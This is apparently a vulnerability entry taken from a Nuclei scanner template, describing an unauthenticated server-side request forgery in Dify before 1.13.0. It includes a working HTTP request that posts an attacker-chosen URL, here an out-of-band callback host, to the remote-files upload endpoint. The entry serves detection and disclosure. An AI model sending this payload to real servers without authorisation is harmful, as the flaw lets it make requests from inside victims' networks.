# Vulnerability: Dify < 1.13.0 - Unauthenticated SSRF via Remote File Upload
**Classification:** CWE-918
**Source:** Nuclei Template (`dify-ssrf-remote-upload.yaml`)

## Description
Detected Dify prior to 1.13.0 is vulnerable to unauthenticated Server-Side Request Forgery via the /console/api/remote-files/upload endpoint. The endpoint accepted a user-controlled URL parameter and issued HTTP requests from the server without authentication or SSRF protections such as private IP blocking.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /console/api/remote-files/upload HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"url":"http://{{interactsh-url}}/ssrf-test"}
```

